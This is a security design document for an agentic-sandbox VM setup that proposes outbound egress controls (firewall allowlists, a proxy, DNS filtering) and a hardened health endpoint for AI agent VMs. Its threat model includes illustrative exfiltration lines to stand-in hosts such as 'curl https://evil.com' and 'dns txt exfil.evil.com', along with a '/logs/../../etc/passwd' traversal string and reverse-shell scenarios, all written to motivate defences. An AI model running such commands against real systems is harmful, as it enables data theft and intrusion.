# Network Egress Controls and Health Endpoint Security Design

**Document Version**: 1.0
**Date**: 2026-01-31
**Author**: Security Architect
**Classification**: Internal - Security Sensitive
**Status**: Draft - Pending Review

---

## Executive Summary

This document addresses two critical security gaps in the agentic-sandbox VM infrastructure:

1. **Network Egress**: VMs currently have unrestricted outbound internet access, enabling data exfiltration to arbitrary services.
2. **Health Endpoint**: The in-VM health server (port 8118) exposes fingerprinting information without authentication.

The design provides multiple implementation options for egress control (ranging from simple to comprehensive) and a secured health endpoint design with minimal breaking changes.

---

## 1. Current State Analysis

### 1.1 Network Egress - Current Implementation

**File**: `/home/roctinam/dev/agentic-sandbox/images/qemu/provision-vm.sh` (lines 682-694)

```bash
# Configure UFW firewall - restrict access to management host only
ufw default deny incoming
ufw default allow outgoing    # <-- SECURITY GAP: Full outbound allowed
ufw allow from $MANAGEMENT_HOST_IP to any port 22 proto tcp
ufw allow from $MANAGEMENT_HOST_IP to any port 8118 proto tcp
echo "y" | ufw enable
```

**Security Gaps**:
| Gap | Risk Level | Description |
|-----|------------|-------------|
| Unrestricted egress | HIGH | Agents can POST data to attacker.com, pastebin, etc. |
| No traffic logging | HIGH | No audit trail for external connections |
| No rate limiting | MEDIUM | Agents can flood external services |
| Direct API access | HIGH | Agents can bypass credential proxy if implemented |
| DNS unrestricted | MEDIUM | DNS tunneling possible for data exfiltration |

### 1.2 Health Endpoint - Current Implementation

**File**: `/home/roctinam/dev/agentic-sandbox/images/qemu/provision-vm.sh` (lines 521-628)

The health server is a Python HTTP server on port 8118 with these endpoints:

| Endpoint | Data Exposed | Risk |
|----------|-------------|------|
| `/health` | hostname, uptime, load_avg, setup status | Fingerprinting |
| `/ready` | setup completion status | Minimal |
| `/logs/<file>` | Arbitrary log file contents | HIGH - Path traversal possible |
| `/stream/stdout` | Agent stdout stream | MEDIUM |
| `/stream/stderr` | Agent stderr stream | MEDIUM |

**Security Gaps**:
| Gap | Risk Level | Description |
|-----|------------|-------------|
| No authentication | HIGH | Anyone on network can query |
| Information disclosure | MEDIUM | Hostname, uptime reveal VM identity |
| Path traversal risk | HIGH | `/logs/../../etc/passwd` possible |
| No rate limiting | LOW | DoS via repeated log streaming |
| Plaintext transport | LOW | Sensitive logs in transit |

---

## 2. Threat Model Summary

### 2.1 Data Exfiltration Vectors (Egress)

```
                    Attacker Infrastructure
                            ^
                            | HTTPS POST, DNS tunnel, etc.
+---------------------------|--------------------------+
|           VM              |                          |
|  +-------------------+    |                          |
|  | Malicious Agent   |--->| curl https://evil.com   |
|  | Code              |    | dns txt exfil.evil.com   |
|  +-------------------+    | ICMP tunnel              |
|                           |                          |
+---------------------------|--------------------------+
                            |
                  Current: ALLOWED (no egress filtering)
```

**Attack Scenarios**:
1. **Code theft**: Agent exfiltrates cloned repository to external server
2. **Credential extraction**: Agent reads `/etc/agentic-sandbox/agent.env`, POSTs secret
3. **Reverse shell**: Agent establishes C2 connection for persistent access
4. **API key abuse**: Agent uses injected API keys for unauthorized requests

### 2.2 Health Endpoint Attack Vectors

```
           Attacker (same network)
                   |
                   v
+------------------+-------------------+
|     VM Health Server :8118           |
|                                      |
|  /health   -> hostname, uptime       |
|  /logs/..  -> path traversal         |
|  /stream/* -> continuous log access  |
+--------------------------------------+
```

**Attack Scenarios**:
1. **Reconnaissance**: Query all VMs to map infrastructure
2. **Log scraping**: Extract sensitive data from agent logs
3. **Path traversal**: Read `/etc/passwd`, `/etc/shadow` via `/logs/../../`

---

## 3. Egress Control Options

### Option A: UFW-Based Domain/IP Allowlist (Simple)

**Implementation Complexity**: Low
**Operational Overhead**: Medium
**Bypass Resistance**: Low-Medium

#### Design

Modify cloud-init to configure UFW with explicit outbound allowlist:

```bash
# Default deny egress
ufw default deny outgoing

# Management server access (required for agent operation)
ufw allow out to 192.168.122.1 port 8120 proto tcp  # gRPC
ufw allow out to 192.168.122.1 port 53 proto udp    # DNS (optional)

# Explicitly allowed destinations (resolved at provision time)
# These are IPs because UFW doesn't support domain-based rules
for domain in $ALLOWED_DOMAINS; do
    for ip in $(dig +short $domain A); do
        ufw allow out to $ip port 443 proto tcp
    done
done

# Block all other egress (implicit with deny default)
```

#### Configuration Example

**Network mode: `isolated`** (default for sensitive tasks)
```bash
ALLOWED_DOMAINS=""
# Result: Only management server access
```

**Network mode: `allowlist`** (standard dev tasks)
```bash
ALLOWED_DOMAINS="api.anthropic.com github.com api.github.com registry.npmjs.org pypi.org"
```

**Network mode: `full`** (unrestricted, legacy behavior)
```bash
# ufw default allow outgoing (existing behavior)
```

#### Provisioning Script Changes

```bash
# In provision-vm.sh, add --network-mode option
# Lines 309-310 become:
--network NET         libvirt network (default: default)
--network-mode MODE   Egress control: isolated|allowlist|full (default: full)
```

#### Pros and Cons

| Aspect | Evaluation |
|--------|------------|
| **Pros** | Simple implementation, no new dependencies |
| | Uses existing UFW infrastructure |
| | Clear audit via `ufw status` |
| **Cons** | IP addresses change; rules become stale |
| | No logging of blocked attempts (without custom iptables) |
| | Domain resolution at provision time only |
| | Large allowlists become unwieldy |

#### Impact on Agent Workflows

| Operation | isolated | allowlist | full |
|-----------|----------|-----------|------|
| gRPC to management | Works | Works | Works |
| `npm install` | BREAKS | Partial (if npmjs.org in list) | Works |
| `pip install` | BREAKS | Partial (if pypi.org in list) | Works |
| `git clone github.com` | BREAKS | Works (if in list) | Works |
| `curl api.anthropic.com` | BREAKS | Works (if in list) | Works |
| `curl evil.com` | BLOCKED | BLOCKED | Works |

---

### Option B: Transparent Proxy with Logging (Comprehensive)

**Implementation Complexity**: High
**Operational Overhead**: High
**Bypass Resistance**: Medium-High

#### Design

Deploy a transparent HTTP/HTTPS proxy on the host that intercepts all outbound traffic from VMs.

```
+------------------+        +-------------------+        +-------------+
|  VM Agent        | HTTP   | Transparent Proxy | HTTPS  | External    |
|  curl example.com|------->| (Squid/mitmproxy) |------->| Services    |
|                  |        |                   |        |             |
|                  |        | - Domain allowlist|        |             |
|                  |        | - Full logging    |        |             |
|                  |        | - Rate limiting   |        |             |
+------------------+        +-------------------+        +-------------+
        |                            |
        |                            |
   (NAT/iptables                  Audit logs
    redirect to proxy)
```

#### Components

1. **Squid Proxy** (host-side, port 3128)
   - Domain-based ACLs
   - Access logging per request
   - Connection rate limiting
   - CONNECT tunneling for HTTPS

2. **iptables NAT rules** (on host)
   ```bash
   # Redirect VM traffic to proxy
   iptables -t nat -A PREROUTING -s 192.168.122.0/24 \
       -p tcp --dport 443 -j REDIRECT --to-port 3128
   iptables -t nat -A PREROUTING -s 192.168.122.0/24 \
       -p tcp --dport 80 -j REDIRECT --to-port 3128
   ```

3. **VM-side proxy env** (optional, for non-transparent mode)
   ```bash
   export HTTP_PROXY=http://host.internal:3128
   export HTTPS_PROXY=http://host.internal:3128
   ```

#### Squid ACL Configuration

```squid
# /etc/squid/squid.conf (excerpt)

# Define ACLs for allowed domains
acl allowed_domains dstdomain .github.com
acl allowed_domains dstdomain .anthropic.com
acl allowed_domains dstdomain .npmjs.org
acl allowed_domains dstdomain .pypi.org

# Allow CONNECT for HTTPS to allowed domains only
http_access allow CONNECT allowed_domains
http_access deny CONNECT all

# HTTP access rules
http_access allow allowed_domains
http_access deny all

# Logging
access_log daemon:/var/log/squid/access.log squid
log_format squid %ts.%03tu %6tr %>a %Ss/%03>Hs %<st %rm %ru %un %Sh/%<a %mt
```

#### Rate Limiting (squid.conf)

```squid
# Rate limit per-IP
delay_pools 1
delay_class 1 1
delay_parameters 1 1000000/1000000  # 1MB/s total
delay_access 1 allow all
```

#### Pros and Cons

| Aspect | Evaluation |
|--------|------------|
| **Pros** | Comprehensive logging of all traffic |
| | Domain-based rules (not IP-dependent) |
| | Rate limiting built-in |
| | Can inspect HTTP content (not HTTPS) |
| **Cons** | Complex setup and maintenance |
| | HTTPS inspection requires TLS MITM (not recommended) |
| | Single point of failure for all VM traffic |
| | Performance overhead (all traffic proxied) |
| | Non-HTTP protocols still bypass proxy |

#### Impact on Agent Workflows

| Operation | With Proxy |
|-----------|------------|
| HTTP/HTTPS to allowed domains | Works, logged |
| HTTP/HTTPS to blocked domains | Blocked, logged |
| Non-HTTP protocols (SSH, gRPC) | Bypass proxy (separate rules needed) |
| Direct IP connections | Works (circumvents domain ACLs) |

---

### Option C: DNS-Based Filtering (Lightweight)

**Implementation Complexity**: Medium
**Operational Overhead**: Low
**Bypass Resistance**: Low

#### Design

Configure VMs to use a host-based DNS resolver that filters domains.

```
+------------------+        +-------------------+        +-------------+
|  VM Agent        | DNS    | Pi-hole/Blocky    |        | Upstream    |
|  nslookup x.com  |------->| (host :53)        |------->| DNS (8.8.8.8)|
|                  |        |                   |        |             |
|                  |        | - Block unknown   |        |             |
|                  |        | - Log all queries |        |             |
+------------------+        +-------------------+        +-------------+
```

#### Implementation

1. **Deploy DNS filter** (Pi-hole or Blocky)
   ```bash
   # Docker deployment on host
   docker run -d --name blocky \
       -p 53:53/udp -p 53:53/tcp \
       -v /etc/blocky/config.yml:/app/config.yml \
       spx01/blocky
   ```

2. **Blocky configuration**
   ```yaml
   # /etc/blocky/config.yml
   upstream:
     default:
       - 8.8.8.8
       - 8.8.4.4

   blocking:
     blackLists:
       default:
         - "*"  # Block all domains
     whiteLists:
       default:
         - api.anthropic.com
         - github.com
         - api.github.com
         - registry.npmjs.org
         - pypi.org

   logging:
     level: info
     format: json
     privacy: false  # Log full queries for audit

   queryLog:
     type: csv
     target: /var/log/blocky/query.log
   ```

3. **VM DNS configuration** (cloud-init)
   ```yaml
   resolv_conf:
     nameservers:
       - 192.168.122.1  # Host IP running DNS filter
     options:
       edns0: true
   ```

#### Pros and Cons

| Aspect | Evaluation |
|--------|------------|
| **Pros** | Lightweight, minimal performance impact |
| | Full query logging for audit |
| | Easy to maintain allowlist |
| **Cons** | Agents can bypass via direct IP connections |
| | Agents can use alternative DNS (if not blocked) |
| | No traffic content inspection |
| | DoH/DoT can bypass filtering |

#### Impact on Agent Workflows

| Operation | With DNS Filtering |
|-----------|-------------------|
| Domain-based requests (allowed) | Works, logged |
| Domain-based requests (blocked) | DNS fails, no IP returned |
| Direct IP connections | Works (bypasses filter) |
| Alternative DNS (8.8.8.8) | Must be blocked at firewall |

---

### Option D: Hybrid Approach (Recommended)

**Implementation Complexity**: Medium
**Operational Overhead**: Medium
**Bypass Resistance**: High

Combine UFW egress rules with DNS filtering for defense-in-depth:

```
+------------------+        +-------------------+        +-------------+
|  VM Agent        |        | Host DNS Filter   |        |             |
|                  | DNS    | (Blocky)          |        |             |
|  1. DNS query    |------->| - Allowlist check |        |             |
|     github.com   |        | - Return IP or    |        |             |
|                  |<-------| - NXDOMAIN        |        |             |
|                  |        +-------------------+        |             |
|  2. If allowed,  |                                     |             |
|     connect IP   | HTTPS                               |             |
|                  |----------------------------------------->| github.com |
|                  |        +-------------------+        |             |
|                  |        | UFW Egress Rules  |        |             |
|                  |        | - Allow 443/tcp   |        |             |
|                  |        | - Block other     |        |             |
|                  |        +-------------------+        |             |
+------------------+                                     +-------------+
```

#### Configuration

**DNS Filter (Blocky)**:
- Allowlist-only mode
- Log all queries (allowed and denied)
- Return NXDOMAIN for blocked domains

**UFW Rules (VM-side)**:
```bash
ufw default deny outgoing

# Required: Management access
ufw allow out to 192.168.122.1 port 8120 proto tcp  # gRPC
ufw allow out to 192.168.122.1 port 53              # DNS (filtered)

# HTTPS only (443/tcp) - DNS filter controls destinations
ufw allow out to any port 443 proto tcp

# Block direct DNS to external servers (force use of host DNS)
ufw deny out to any port 53
ufw deny out to any port 853  # DoT
```

#### Defense-in-Depth Matrix

| Attack | DNS Filter | UFW | Combined |
|--------|------------|-----|----------|
| curl evil.com | NXDOMAIN, blocked | N/A | Blocked |
| curl IP-of-evil.com | N/A | Allowed (443) | **Gap** - use proxy for this |
| DNS exfiltration | Logged, anomaly detection | Blocked (external 53) | Blocked |
| Non-HTTPS protocols | N/A | Blocked | Blocked |

**To close the direct-IP gap**: Add transparent proxy for known-bad CIDRs or use eBPF-based egress policy.

---

## 4. Health Endpoint Security Design

### 4.1 Threat Mitigation Requirements

| Threat | Mitigation |
|--------|-----------|
| Unauthorized access | Bearer token authentication |
| Information disclosure | Minimize response data |
| Path traversal | Remove `/logs/*` endpoint or use allowlist |
| DoS via streaming | Add rate limiting |
| Plaintext transport | (Optional) TLS or rely on network isolation |

### 4.2 Secured Health Server Design

#### Changes Summary

| Endpoint | Before | After |
|----------|--------|-------|
| `/health` | Returns hostname, uptime, load_avg | Returns `status` only (or require auth for full) |
| `/ready` | No auth, returns ready status | No auth (safe), returns ready status |
| `/logs/*` | No auth, arbitrary file access | REMOVED (security risk) |
| `/stream/*` | No auth, log streaming | Requires bearer token |

#### Implementation

```python
#!/usr/bin/env python3
"""Secured health check server for agentic-sandbox VMs - port 8118

Security changes:
- Bearer token authentication for sensitive endpoints
- Minimal information disclosure on public endpoints
- Path traversal protection (remove arbitrary log access)
- Rate limiting via request tracking
"""
import http.server
import json
import os
import time
import hashlib
from datetime import datetime
from functools import wraps

PORT = 8118
BOOT_TIME = time.time()
AUTH_TOKEN_PATH = "/etc/agentic-sandbox/health-token"
REQUEST_COUNTS = {}  # IP -> (count, window_start)
RATE_LIMIT = 60  # requests per minute
RATE_WINDOW = 60  # seconds

def load_auth_token():
    """Load bearer token from file (generated at provisioning)"""
    try:
        with open(AUTH_TOKEN_PATH) as f:
            return f.read().strip()
    except:
        return None

AUTH_TOKEN = load_auth_token()

def rate_limited(ip):
    """Check if IP is rate limited"""
    now = time.time()
    if ip not in REQUEST_COUNTS:
        REQUEST_COUNTS[ip] = (1, now)
        return False

    count, window_start = REQUEST_COUNTS[ip]
    if now - window_start > RATE_WINDOW:
        REQUEST_COUNTS[ip] = (1, now)
        return False

    if count >= RATE_LIMIT:
        return True

    REQUEST_COUNTS[ip] = (count + 1, window_start)
    return False

class SecuredHealthHandler(http.server.BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        # Silent logging (or log to file for audit)
        pass

    def check_auth(self):
        """Verify bearer token in Authorization header"""
        if not AUTH_TOKEN:
            # No token configured = auth disabled (dev mode)
            return True

        auth_header = self.headers.get("Authorization", "")
        if auth_header.startswith("Bearer "):
            provided_token = auth_header[7:]
            # Constant-time comparison to prevent timing attacks
            return hashlib.sha256(provided_token.encode()).digest() == \
                   hashlib.sha256(AUTH_TOKEN.encode()).digest()
        return False

    def send_json(self, data, status=200):
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())

    def send_error_json(self, status, message):
        self.send_json({"error": message}, status)

    def do_GET(self):
        client_ip = self.client_address[0]

        # Rate limiting
        if rate_limited(client_ip):
            self.send_error_json(429, "rate_limit_exceeded")
            return

        # Public endpoints (no auth required)
        if self.path == "/ready":
            ready = os.path.exists("/var/run/agentic-setup-complete") or \
                    os.path.exists("/var/run/cloud-init-complete")
            self.send_json({"ready": ready}, 200 if ready else 503)
            return

        if self.path in ("/health", "/"):
            # Minimal response for unauthenticated requests
            if not self.check_auth():
                self.send_json({"status": "healthy"})
                return

            # Full response for authenticated requests
            self.send_json(self.collect_health())
            return

        # Authenticated endpoints
        if not self.check_auth():
            self.send_error_json(401, "authentication_required")
            return

        # /logs/* endpoint REMOVED for security
        # /stream/* requires authentication and is restricted
        if self.path.startswith("/stream/"):
            stream_type = self.path[8:]
            if stream_type not in ("stdout", "stderr"):
                self.send_error_json(404, "stream_not_found")
                return
            self.stream_agent_log(stream_type)
            return

        self.send_error_json(404, "not_found")

    def collect_health(self):
        """Full health data (for authenticated requests only)"""
        return {
            "status": "healthy",
            "hostname": os.uname().nodename,
            "uptime_seconds": int(time.time() - BOOT_TIME),
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "cloud_init_complete": os.path.exists("/var/run/cloud-init-complete"),
            "setup_complete": os.path.exists("/var/run/agentic-setup-complete"),
            "load_avg": list(os.getloadavg())
        }

    def stream_agent_log(self, log_type):
        """Stream stdout or stderr (authenticated only, restricted paths)"""
        LOG_DIR = "/var/log"
        log_file = os.path.join(LOG_DIR, f"agent-{log_type}.log")

        if not os.path.exists(log_file):
            self.send_error_json(404, f"{log_type}_log_not_found")
            return

        self.send_response(200)
        self.send_header("Content-Type", "text/event-stream")
        self.send_header("Cache-Control", "no-cache")
        self.send_header("Connection", "keep-alive")
        self.end_headers()

        # Implementation continues (tail -f equivalent)
        # ... (existing implementation)

if __name__ == "__main__":
    http.server.HTTPServer(("0.0.0.0", PORT), SecuredHealthHandler).serve_forever()
```

#### Token Generation at Provisioning

Add to cloud-init `write_files`:

```yaml
- path: /etc/agentic-sandbox/health-token
  permissions: '0600'
  owner: root:root
  content: |
    HEALTH_TOKEN_PLACEHOLDER
```

Generate token in `provision-vm.sh`:

```bash
# Generate health endpoint token
health_token=$(openssl rand -hex 32)
# Store on host for management server access
echo "$vm_name=$health_token" >> "$SECRETS_DIR/health-tokens"
# Inject into cloud-init
sed -i "s/HEALTH_TOKEN_PLACEHOLDER/$health_token/" "$output_dir/user-data"
```

---

## 5. Configuration Examples

### 5.1 Isolated Mode (Most Restrictive)

For processing sensitive code or security audits.

**cloud-init excerpt**:
```yaml
runcmd:
  # UFW: Deny all egress except management
  - ufw default deny incoming
  - ufw default deny outgoing
  - ufw allow in from 192.168.122.1 to any port 22
  - ufw allow in from 192.168.122.1 to any port 8118
  - ufw allow out to 192.168.122.1 port 8120 proto tcp
  - ufw --force enable
  # Disable DNS resolution entirely
  - systemctl disable --now systemd-resolved
  - echo "nameserver 127.0.0.1" > /etc/resolv.conf
```

### 5.2 Allowlist Mode (Standard Development)

For tasks requiring external access to specific services.

**cloud-init excerpt**:
```yaml
runcmd:
  # UFW: Allow 443 egress (DNS controls destinations)
  - ufw default deny incoming
  - ufw default deny outgoing
  - ufw allow in from 192.168.122.1 to any port 22
  - ufw allow in from 192.168.122.1 to any port 8118
  - ufw allow out to 192.168.122.1 port 8120 proto tcp
  - ufw allow out to 192.168.122.1 port 53
  - ufw allow out to any port 443 proto tcp
  - ufw deny out to any port 53  # Block external DNS
  - ufw --force enable
  # Use host DNS (filtered)
  - echo "nameserver 192.168.122.1" > /etc/resolv.conf
```

**Host DNS filter allowlist** (`/etc/blocky/allowlist.txt`):
```
api.anthropic.com
github.com
api.github.com
objects.githubusercontent.com
raw.githubusercontent.com
registry.npmjs.org
pypi.org
files.pythonhosted.org
```

### 5.3 Full Mode (Unrestricted - Legacy)

For tasks requiring unrestricted internet access.

**cloud-init excerpt**:
```yaml
runcmd:
  - ufw default deny incoming
  - ufw default allow outgoing  # Unrestricted egress
  - ufw allow in from 192.168.122.1 to any port 22
  - ufw allow in from 192.168.122.1 to any port 8118
  - ufw --force enable
```

---

## 6. Impact Analysis

### 6.1 What Breaks by Network Mode

| Scenario | isolated | allowlist | full |
|----------|----------|-----------|------|
| Agent connects to management server | Works | Works | Works |
| `npm install` | BREAKS | Works (if npm in allowlist) | Works |
| `pip install` | BREAKS | Works (if pypi in allowlist) | Works |
| `apt update` | BREAKS | Works (if ubuntu repos in allowlist) | Works |
| `git clone github.com/...` | BREAKS | Works (if github in allowlist) | Works |
| `curl api.anthropic.com` | BREAKS | Works (if in allowlist) | Works |
| `curl random-api.com` | BLOCKED | BLOCKED | Works |
| `wget evil-site.com` | BLOCKED | BLOCKED | Works |
| Claude Code API calls | BREAKS | Works (if anthropic in allowlist) | Works |

### 6.2 Mitigation Strategies for Broken Workflows

**For `isolated` mode**:
- Pre-populate `/mnt/global` with cached dependencies
- Use offline package mirrors
- Accept that external dependencies are not available

**For `allowlist` mode**:
- Maintain curated allowlist for common development services
- Provide task-specific allowlist overrides in manifest
- Document required domains per task type

**Example task manifest with network config**:
```yaml
task:
  id: "a1b2c3d4"
  network_mode: "allowlist"
  allowed_domains:
    - "api.anthropic.com"
    - "github.com"
    - "registry.npmjs.org"
```

---

## 7. Implementation Roadmap

### Phase 1: Health Endpoint Security (Week 1)

| Task | Priority | Effort |
|------|----------|--------|
| Add bearer token to health endpoint | P0 | 2 hours |
| Remove `/logs/*` path traversal risk | P0 | 1 hour |
| Add rate limiting | P1 | 2 hours |
| Minimize unauthenticated `/health` response | P1 | 1 hour |
| Update provisioning to generate health tokens | P1 | 2 hours |
| Update management server to use health tokens | P1 | 4 hours |

### Phase 2: Basic Egress Control (Week 2)

| Task | Priority | Effort |
|------|----------|--------|
| Add `--network-mode` flag to provisioning | P0 | 4 hours |
| Implement `isolated` mode UFW rules | P0 | 2 hours |
| Test `isolated` mode with task execution | P0 | 4 hours |
| Document mode selection criteria | P1 | 2 hours |

### Phase 3: DNS Filtering (Week 3)

| Task | Priority | Effort |
|------|----------|--------|
| Deploy Blocky DNS filter on host | P1 | 4 hours |
| Create default allowlist for dev tasks | P1 | 2 hours |
| Implement `allowlist` mode integration | P1 | 4 hours |
| Add DNS query logging for audit | P2 | 4 hours |

### Phase 4: Enhanced Controls (Week 4+)

| Task | Priority | Effort |
|------|----------|--------|
| (Optional) Transparent proxy for full logging | P2 | 1 week |
| Per-task allowlist in manifest | P2 | 4 hours |
| Egress anomaly detection | P3 | 2 weeks |

---

## 8. Recommended Default Policy

Based on security vs. usability trade-off analysis:

### Recommended Defaults

| Setting | Value | Rationale |
|---------|-------|-----------|
| Default network mode | `allowlist` | Balances security with usability |
| Default allowlist | See below | Common dev services |
| Health auth | Required | Prevent fingerprinting |
| Health rate limit | 60/min | Prevent DoS |

### Default Allowlist

```
# AI/LLM APIs
api.anthropic.com
api.openai.com

# Code Hosting
github.com
api.github.com
*.githubusercontent.com
gitlab.com
bitbucket.org

# Package Registries
registry.npmjs.org
pypi.org
files.pythonhosted.org
crates.io
static.crates.io
pkg.go.dev
proxy.golang.org

# Build Tools
registry.yarnpkg.com
```

### Override for Sensitive Tasks

Task manifests can specify `network_mode: isolated` for:
- Security audits
- Processing proprietary code
- Compliance-sensitive workloads

---

## 9. Security Gate Verification

### Pre-Production Checklist

- [ ] Health endpoint requires authentication for full data
- [ ] Path traversal `/logs/*` endpoint removed
- [ ] Rate limiting active on health endpoint
- [ ] `isolated` mode tested and working
- [ ] `allowlist` mode tested with common dev tasks
- [ ] DNS filtering logging enabled
- [ ] UFW rules persist across reboot
- [ ] Management server can still query VMs

### Per-Task Verification

- [ ] Network mode appropriate for task sensitivity
- [ ] Allowlist includes all required domains
- [ ] Health token rotated on reprovision

---

## 10. References

| Document | Path |
|----------|------|
| Security Architecture | `/home/roctinam/dev/agentic-sandbox/.aiwg/security/security-architecture.md` |
| ADR-004 Network Isolation | `/home/roctinam/dev/agentic-sandbox/.aiwg/architecture/adr/ADR-004-network-isolation.md` |
| Provisioning Script | `/home/roctinam/dev/agentic-sandbox/images/qemu/provision-vm.sh` |
| Agent Client | `/home/roctinam/dev/agentic-sandbox/agent-rs/src/main.rs` |
| VM Health Server (current) | Embedded in provision-vm.sh (lines 521-628) |

---

## Appendix A: UFW Rule Reference

### Isolated Mode
```bash
ufw default deny incoming
ufw default deny outgoing
ufw allow in from 192.168.122.1 to any port 22 proto tcp
ufw allow in from 192.168.122.1 to any port 8118 proto tcp
ufw allow out to 192.168.122.1 port 8120 proto tcp
```

### Allowlist Mode
```bash
ufw default deny incoming
ufw default deny outgoing
ufw allow in from 192.168.122.1 to any port 22 proto tcp
ufw allow in from 192.168.122.1 to any port 8118 proto tcp
ufw allow out to 192.168.122.1 port 8120 proto tcp
ufw allow out to 192.168.122.1 port 53
ufw allow out to any port 443 proto tcp
ufw deny out to any port 53
```

### Full Mode
```bash
ufw default deny incoming
ufw default allow outgoing
ufw allow in from 192.168.122.1 to any port 22 proto tcp
ufw allow in from 192.168.122.1 to any port 8118 proto tcp
```

---

## Appendix B: Blocky DNS Filter Configuration

```yaml
# /etc/blocky/config.yml
# DNS-based egress filtering for agentic-sandbox VMs

upstream:
  default:
    - 8.8.8.8
    - 8.8.4.4

blocking:
  blackLists:
    ads:
      - https://raw.githubusercontent.com/StevenBlack/hosts/master/hosts

  whiteLists:
    development:
      - api.anthropic.com
      - api.openai.com
      - github.com
      - api.github.com
      - "*.githubusercontent.com"
      - registry.npmjs.org
      - pypi.org
      - files.pythonhosted.org
      - crates.io
      - proxy.golang.org

  clientGroupsBlock:
    default:
      - ads
    # VMs on 192.168.122.x get strict filtering
    192.168.122.0/24:
      - ads
      - "*"  # Block all except whitelist

blocking:
  loading:
    refreshPeriod: 24h

ports:
  dns: 53

log:
  level: info
  format: json

queryLog:
  type: csv
  target: /var/log/blocky/query.log
  logRetentionDays: 30
```

---

**Document Revision History**

| Date | Version | Author | Changes |
|------|---------|--------|---------|
| 2026-01-31 | 1.0 | Security Architect | Initial design |
